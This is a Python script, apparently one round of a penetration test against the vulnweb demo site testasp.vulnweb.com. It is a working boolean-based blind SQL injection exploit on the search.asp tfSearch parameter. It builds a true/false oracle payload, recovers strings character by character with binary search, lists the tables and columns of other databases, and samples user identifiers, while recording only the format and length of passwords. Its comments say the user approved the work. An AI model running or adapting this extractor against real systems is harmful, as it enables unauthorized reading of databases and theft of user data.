#!/usr/bin/env python3
"""Round 9 — 교차 애플리케이션 DB 실데이터 확인 (사용자 승인 ①) + acuservice 스키마 열거 (③).

승인 범위: acublog / acuservice 의 users 테이블 실데이터 접근.
정책: 계정 식별자(uname/email 등)는 증거로 기록하되, **비밀번호류 값은 추출·기록하지 않는다**
      (형식·길이·일치여부만). 전부 읽기 전용 SELECT, 상태 변경 0건.
"""
import json, urllib.parse, urllib.request, urllib.error

BASE = "http://testasp.vulnweb.com/search.asp"
REQ = {"n": 0}


def oracle(cond):
    st = "zzq')>0 OR (" + cond + "))--"
    url = BASE + "?tfSearch=" + urllib.parse.quote(st, safe="")
    REQ["n"] += 1
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            return "class='posttext'" in r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        b = e.read().decode("latin-1", "replace")
        return None if e.code == 500 else ("class='posttext'" in b)
    except Exception:
        return None


def exact_int(expr, lo=0, hi=200000):
    if oracle(f"({expr})>={lo}") is not True:
        return None
    while lo < hi:
        mid = (lo + hi + 1) // 2
        r = oracle(f"({expr})>={mid}")
        if r is True:
            lo = mid
        elif r is False:
            hi = mid - 1
        else:
            return None
    return lo


def extract(expr, n):
    out = ""
    for i in range(1, n + 1):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = oracle(f"(SELECT ASCII(SUBSTRING(({expr}),{i},1)))>{mid}")
            if r is True:
                lo = mid + 1
            elif r is False:
                hi = mid
            else:
                return out + "<?>"
        if lo <= 1:
            break
        out += chr(lo)
    return out


def sget(expr, cap=60):
    if oracle(f"({expr}) IS NOT NULL") is not True:
        return None
    ln = exact_int(f"LEN({expr})", 1, cap)
    return extract(expr, ln) if ln else None


def cols_of(db, tbl):
    e = (f"(SELECT COUNT(*) FROM {db}.sys.columns WHERE object_id="
         f"(SELECT object_id FROM {db}.sys.tables WHERE name='{tbl}'))")
    n = exact_int(e, 0, 60)
    out = []
    for cid in range(1, (n or 0) + 1):
        nm = sget(f"(SELECT name FROM {db}.sys.columns WHERE object_id="
                  f"(SELECT object_id FROM {db}.sys.tables WHERE name='{tbl}') AND column_id={cid})", 40)
        if nm:
            out.append(nm)
    return out


R = {}
print("### 0. 오라클 기준선")
print("  TRUE:", oracle("1=1"), " FALSE:", oracle("1=2"))

for db in ["acuservice", "acublog"]:
    print(f"\n{'='*60}\n### DB = {db}   (HAS_DBACCESS={sget(f'DB_NAME(DB_ID())',10) is not None})\n{'='*60}")
    R[db] = {}
    print(f"-- 테이블/뷰/프로시저 수")
    R[db]["tables"] = exact_int(f"(SELECT COUNT(*) FROM {db}.sys.tables)", 0, 500)
    R[db]["views"] = exact_int(f"(SELECT COUNT(*) FROM {db}.sys.views)", 0, 500)
    R[db]["procs"] = exact_int(f"(SELECT COUNT(*) FROM {db}.sys.procedures)", 0, 500)
    print(f"   tables={R[db]['tables']} views={R[db]['views']} procs={R[db]['procs']}")

    print("-- 테이블 이름 전량 (③)")
    names, prev = [], ""
    for k in range(1, 16):
        cond = f"(SELECT MIN(name) FROM {db}.sys.tables WHERE name > '{prev}')"
        if oracle(f"{cond} IS NOT NULL") is not True:
            break
        ln = exact_int(f"LEN({cond})", 1, 40)
        if not ln:
            break
        nm = extract(cond, ln)
        names.append(nm); prev = nm.replace("'", "''")
        print(f"   [{k}] {nm}")
    R[db]["table_names"] = names

    if "users" not in names:
        print("   (users 테이블 없음 — 스킵)"); continue

    print("-- users 컬럼")
    cs = cols_of(db, "users")
    R[db]["users_columns"] = cs
    print("  ", cs)

    n_rows = exact_int(f"(SELECT COUNT(*) FROM {db}.dbo.users)", 0, 200000)
    R[db]["users_rows"] = n_rows
    print(f"   행 수 = {n_rows}")

    # 컬럼 역할 추정
    pw_col = next((c for c in cs if any(k in c.lower() for k in ("pass", "pwd", "secret"))), None)
    un_col = next((c for c in cs if any(k in c.lower() for k in ("user", "name", "login", "mail"))), None)
    R[db]["password_column"] = pw_col
    R[db]["identifier_column"] = un_col
    print(f"   추정: 식별자컬럼={un_col!r} 비밀번호컬럼={pw_col!r}")

    if un_col:
        print(f"-- {un_col} 값 표본 (최대 5, 교차 앱 실데이터 — 승인①)")
        vals, prev = [], ""
        for k in range(1, 6):
            cond = f"(SELECT MIN({un_col}) FROM {db}.dbo.users WHERE {un_col} > '{prev}')"
            if oracle(f"{cond} IS NOT NULL") is not True:
                break
            ln = exact_int(f"LEN({cond})", 1, 50)
            if not ln:
                break
            v = extract(cond, ln)
            vals.append(v); prev = v.replace("'", "''")
            print(f"   [{k}] {v!r}")
        R[db]["identifier_samples"] = vals

    if pw_col:
        print(f"-- {pw_col} 저장형식 (값 미기록)")
        for lab, c in [("길이<=12 행 존재", f"(SELECT COUNT(*) FROM {db}.dbo.users WHERE LEN({pw_col})<=12)>0"),
                       ("길이>=32 행 존재", f"(SELECT COUNT(*) FROM {db}.dbo.users WHERE LEN({pw_col})>=32)>0"),
                       ("전부 16진 행 존재", f"(SELECT COUNT(*) FROM {db}.dbo.users WHERE {pw_col} NOT LIKE '%[^0-9a-fA-F]%')>0"),
                       ("평균길이>=16", f"(SELECT AVG(LEN({pw_col})) FROM {db}.dbo.users)>=16")]:
            v = oracle(c)
            R[db].setdefault("password_format", {})[lab] = v
            print(f"   {'TRUE ' if v else 'FALSE'}  {lab}")
        R[db]["password_avg_len"] = exact_int(f"(SELECT AVG(LEN({pw_col})) FROM {db}.dbo.users)", 0, 200)
        print(f"   평균 길이(정수부) = {R[db]['password_avg_len']}")

print("\n### 요약")
R["requests"] = REQ["n"]
with open("out/db_facts4.json", "w", encoding="utf-8") as f:
    json.dump(R, f, ensure_ascii=False, indent=2)
print(f"  총 요청 {REQ['n']}건 → out/db_facts4.json")
